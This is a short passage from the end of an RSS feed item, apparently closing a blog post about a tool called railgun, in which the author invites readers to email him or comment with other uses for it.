&lt;/blockquote&gt;

&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>